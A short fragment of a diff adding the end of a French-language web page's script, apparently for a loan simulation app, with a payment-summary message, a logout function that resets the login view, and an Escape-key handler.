+ '<div class="success">Simulation  : environ <b>'+monthly.toFixed(2)+' € / mois</b> sur '+duration+' mois.</div>';
+}
+
+function logout(){
+ document.getElementById('application').style.display='none';
+ document.getElementById('login').style.display='flex';
+ document.getElementById('loginCode').value='';
+ page('home');
+ toast('Déconnexion effectuée');
+}
+
+document.addEventListener('keydown',e=>{
+ if(e.key==='Escape') closeModal();
+});
+</script>
+
+</body>
+</html>
